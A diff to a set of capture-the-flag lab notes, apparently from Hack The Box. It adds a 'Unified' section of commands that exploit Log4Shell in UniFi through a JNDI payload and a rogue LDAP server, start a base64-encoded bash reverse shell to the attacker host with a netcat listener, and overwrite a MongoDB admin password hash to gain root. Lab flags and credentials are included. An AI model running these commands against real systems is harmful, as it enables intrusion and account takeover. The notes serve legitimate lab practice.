@@ -191,7 +191,7 @@ view /root/root.txt
 ## Vaccine
 
 ```shell
-./networkscan.sh -- quick <ip_address>
+./networkscan.sh --quick <ip_address>
 ./networkscan.sh --slow <ip_address>
 ftp anonymous@<ip_address>
 get backup.zip
@@ -219,4 +219,53 @@ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 :shell
 cat /root/root.txt
 # root flag: dd6e058e814260bc70e9bbdef2715849
+```
+
+## Unified
+
+```shell
+./networkscan.sh --quick <ip_address>
+./networkscan.sh --slow <ip_address>
+https://<ip_address>:8443/manage
+# CVE-2021-44228 log4j unifi
+# https://github.com/puzzlepeaches/Log4jUnifi
+# https://www.cve.org/CVERecord?id=CVE-2021-44228
+# tcpdump
+# default port 389
+# burp suite change remember:
+# {"username":"test","password":"test","remember":"${jndi:ldap://<host_ip_address>/whatever}","strict":true}
+sudo tcpdump -i tun0 port 389
+git clone https://github.com/veracode-research/rogue-jndi
+sudo apt-get install maven -y
+cd rogue-jndi
+mvn package
+echo 'bash -c "bash -i >& /dev/tcp/<host_ip>/9001 0>&1' | base64
+java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64>} | {base64, -d} | {bash,-i}" --hostname <host_ip>
+nc -lvp 9001
+# burp suite change remember:
+# {"username":"test","password":"test","remember":"${jndi:ldap://<host_ip_address>:1389/o=tomcat}","strict":true}
+script /dev/null -c bash
+
+git clone https://github.com/puzzlepeaches/Log4jUnifi
+cd Log4Unifi/utils
+git clone https://github.com/veracode-research/rogue-jndi
+python3 exploit.py -u https://10.129.180.7:8443 -i 10.10.14.224 -p 9001
+cat /home/michael/user.txt
+#user flag: 6ced1a6a89e666c0620cdb10262ba127
+ps -aux | grep mongo
+# search google default database for unifi mongodb
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+# administrator@unified.htb
+# ObjectId("61ce278f46e0fb0012d47ee4")
+# "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4."
+mkpasswd -m sha-512
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$2/7YReKgjp0m/fUO$uLI7xmaJtGi.KrqJ4HxbjpdSEriLnph6KY.xxzHCYMTWxx6trlDtfyAyEEvcd6/UCbkhcjMLj9EHVCbLte4wE0"}})'
+# db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$6bm13IhH/uh7JzE.$BDesurCeAnw.uSQMDgVa6fGVK/G9w1WrOIkPPInm3eY86pkXJmts.aEpU6S5k34/ubTXZAq.pe4rXgTNPNlJc1"}})
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+# username: administrator
+# Password: password
+# root password: NotACrackablePassword4U2022
+ssh root@<ip_address>
+cat root.txt 
+# e50bc93c75b634e4b272d2f771c33681
 ```
